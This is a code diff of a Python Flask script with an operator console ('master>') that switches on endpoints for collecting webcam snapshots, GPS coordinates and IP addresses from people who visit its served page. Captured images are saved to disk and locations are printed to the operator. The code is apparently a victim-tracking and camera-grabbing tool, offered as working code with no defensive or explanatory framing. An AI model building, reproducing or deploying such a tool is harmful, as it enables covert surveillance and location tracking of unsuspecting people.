@@ -1,21 +1,21 @@
-from flask import Flask, render_template, request, jsonify, send_from_directory, url_for
+import sys
 import os
-import base64
 import time
 import requests
-
-R = '\033[31m'  # Merah
-Y = '\033[33m'  # Kuning
-B = '\033[34m'  # Biru
-W = '\033[0m'   # Reset
-C = '\033[36m'  # Cyan
-G = '\033[32m'  # Hijau
-M = '\033[35m' 
+import base64
+import signal
+from flask import Flask, render_template, jsonify, request, url_for
+from multiprocessing import Process
 
 app = Flask(__name__)
 
-if not os.path.exists("static/result/image"):
-    os.makedirs("static/result/image")
+R = '\033[31m'
+Y = '\033[33m'
+B = '\033[34m'
+W = '\033[0m'
+C = '\033[36m'
+G = '\033[32m'
+M = '\033[35m'
 
 ascii_art1 = f"""
 {B}⠀⠀⠀⠀⠀       ⢀⣴⣾⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -53,39 +53,74 @@ ascii_art2 = f"""
 {W}
 """
 
-def show_aciart():
+enable_camera = False
+enable_ip = False
+enable_location = False
+
+def show_ascii_art():
     combined_art = '\n'.join(line1 + '   ' + line2 for line1, line2 in zip(ascii_art1.splitlines(), ascii_art2.splitlines()))
     print(combined_art)
 
+
+def print_help():
+    print(f"""{G}
+╔════════════════════════════════════════════════════════════╗
+║                      Command Help Guide                    ║
+╠════════════════════════════════════════════════════════════╣
+║  {Y}start -c{W}        : Enable camera access                    {G}║
+║  {Y}start -ip{W}       : Retrieve public IP                      {G}║
+║  {Y}start -Lc{W}       : Access location                         {G}║
+║  {Y}start all{W}       : Enable all functionalities              {G}║
+║  {Y}open --help{W}     : Show this help message                  {G}║
+╚════════════════════════════════════════════════════════════╝{W}
+""")
+
+def info_frist():
+    print(f"""{Y}
+    {B}||{W}                                      {C}||
+    {B}||{W}    {M}Use command the "start" prefix{W}    {C}||
+    {B}||{W}                                      {C}||{W}
+{Y}open --help : view commands{W}
+""") 
+
+def run_server():
+    app.run(port=4040)
+
 @app.route("/")
 def index():
-    return render_template("index.html")
+    return render_template("index.html", enable_camera=enable_camera, enable_ip=enable_ip, enable_location=enable_location)
 
 @app.route('/get_ip', methods=['GET'])
 def get_ip():
-    ip = requests.get('https://api.ipify.org?format=json').json()['ip']
-    return jsonify({'ip': ip})
+    if enable_ip:
+        ip = requests.get('https://api.ipify.org?format=json').json()['ip']
+        print(f"{G}Public IP accessed from the web: {ip}{W}")  
+        return jsonify({'ip': ip})
+    return jsonify({'error': 'IP retrieval is disabled'}), 403
 
 @app.route("/get_location", methods=["POST"])
 def get_location():
-    data = request.json
-    latitude = data.get("latitude")
-    longitude = data.get("longitude")
-    location_url = f"https://www.google.com/maps?q={latitude},{longitude}"
-    return jsonify({"location_url": location_url})
+    if enable_location:
+        data = request.json
+        latitude = data.get("latitude")
+        longitude = data.get("longitude")
+        location_url = f"https://www.google.com/maps?q={latitude},{longitude}"
+        return jsonify({"location_url": location_url})
+    return jsonify({'error': 'Location retrieval is disabled'}), 403
 
 @app.route("/capture_image", methods=["POST"])
 def capture_image():
-    image_data = request.json.get("image_data")
-    image_filename = f"image_{int(time.time())}.png"
-    image_path = os.path.join("static/result/image", image_filename)
-    
-    with open(image_path, "wb") as img_file:
-        img_file.write(base64.b64decode(image_data))
-    
-    image_url = url_for('static', filename=f'result/image/{image_filename}', _external=True)
+    if enable_camera:
+        image_data = request.json.get("image_data")
+        image_filename = f"image_{int(time.time())}.png"
+        image_path = os.path.join("static/result/image", image_filename)
+        
+        with open(image_path, "wb") as img_file:
+            img_file.write(base64.b64decode(image_data))
 
-    return jsonify({"status": "success", "image_url": image_url})
+        image_url = url_for('static', filename=f'result/image/{image_filename}', _external=True)
+        return jsonify({"status": "success", "image_url": image_url})
+    return jsonify({'error': 'Camera capture is disabled'}), 403
 
 @app.route('/send_ip', methods=['POST'])
 def send_ip():
@@ -101,16 +136,50 @@ def send_location():
     print(f"User Location: {location_url}")
     return jsonify({"status": "success"})
 
-@app.route('/download/<filename>', methods=['GET'])
-def download_file(filename):
-    return send_from_directory('static/result/image', filename, as_attachment=True)
+def interactive_prompt():
+    global enable_camera, enable_ip, enable_location
+    server_process = None
 
-@app.route("/aciart", methods=["GET"])
-def aciart():
-    show_aciart()
-    return jsonify({"ascii_art": "ASCII art displayed in terminal"})
+    while True:
+        try:
+            command = input(f"{B}master>{W}$ ").strip().lower()
+        
+            if command == "open --help":
+                print_help()
+            
+            elif command == "start -c":
+                enable_camera = True
+                enable_ip = enable_location = False
+                print(f"{G}Camera access enabled.{W}")
+            
+            elif command == "start -ip":
+                enable_ip = True
+                enable_camera = enable_location = False
+                print(f"{G}IP retrieval enabled.{W}")
+            
+            elif command == "start -lc":
+                enable_location = True
+                enable_camera = enable_ip = False
+                print(f"{G}Location access enabled.{W}")
+            
+            elif command == "start all":
+                enable_camera = enable_ip = enable_location = True
+                print(f"{G}All functionalities enabled (camera, IP, location).{W}")
+
+            if server_process is None or not server_process.is_alive():
+                server_process = Process(target=run_server)
+                server_process.start()
+
+        except KeyboardInterrupt:
+            # Handle CTRL+C
+            if server_process and server_process.is_alive():
+                server_process.terminate()
+                print(f"\n{R}Server stopped. Returning to master prompt.{W}")
+            else:
+                print(f"\n{R}Exiting main script.{W}")
+                sys.exit(0)
 
 if __name__ == "__main__":
-    show_aciart()
-    app.run(port=4040)
-
+    show_ascii_art()
+    info_frist()
+    interactive_prompt()
